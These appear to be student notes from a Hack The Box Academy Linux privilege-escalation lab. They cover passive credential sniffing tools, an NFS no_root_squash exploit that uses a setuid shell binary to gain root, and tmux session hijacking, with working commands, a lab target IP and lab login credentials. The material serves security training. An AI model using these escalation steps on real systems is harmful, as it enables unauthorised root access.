# Miscellaneous Technique

## Passive Traffic Capture

The following tools are useful for capturing clear text creds, Net-NTLMv2, SMBv2 and/or Kerberos hashes

- tcpdump
- [net-creds](https://github.com/DanMcInerney/net-creds)
- [PCredz](https://github.com/lgandx/PCredz)


### Weak NFS Privileges

- #NFS operates on TCP/UDP port 2049
- #showmount -e TARGET_IP remotely lists NSF accessible mounts

**NFS Options to Set**

Options can be verified in /etc/exports
- root_squash: files created and uploaded by root will be owned by nfsnobody (an unprivileged user). This prevents an attacker from uploading binaries with the SUID bit set
- no_root_squash:  allows for the creation of malicious scripts with the SUID bit set


To demonstrate:
> 1 - With local root, create a binary that executes /bin/sh

> 2 - Mount the /tmp directory locally

> 3 - Copy the root-owned binary 

> 4 - Set the SUID bit

**1. Create /bin/sh executable**

```python
cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

Compile shell.c
```python
htb@NIX02:/tmp$ gcc shell.c -o shell
```

**Steps 2 - 4**

```python
root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:~$ cp shell /mnt
root@Pwnbox:~$ chmod u+s /mnt/shell
```

```python
htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
```

## Hijacking Tmux Sessions

Terminal multiplexers like tmux, terminator are used to all multiple terminal sessions in a single console window.
A tmux window can be detached from a session and hijacked if that session is running/ran with elevated permissions.
The following is an example:

**Create tmux directory with a group called 'dev'**
```python
htb@NIX02:~$ tmux -S /shareds new -s debugsess
htb@NIX02:~$ chown root:devs /shareds
```

The goal is to compromise a user in dev group and attach to the tmux session.
Verify any running tmux processes
==In this example the running process will be **tmux -S /shareds new -s debugsess**==
```python
 ps aux | grep tmux
```

**Attach to the tmux session and confirm root privileges**
```python
tmux -S /shareds
```
```python
id
```


# Questions: Misc Techniques

**Target IP**
```
10.129.2.210
```

**Username**
```
htb-student
```

**Password**
```
Academy_LLPE!
```

**SSH**
```
ssh htb-student@10.129.2.210
```

What shares are currently mounted?
```
htb-student@NIX02:~$ showmount -e 10.129.2.210
Export list for 10.129.2.210:
/tmp             *
/var/nfs/general *
```

#shares
```
tmp
```
```
/var/nfs/general
```

Verify what options are currently set for NFS

The ==no_root_squash== option is set
```
htb-student@NIX02:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

Create mounting point
```
mkdir mnt
```

Attempt mount
```
sudo mount -t nfs NIX02:/var/nfs/general /mnt
```

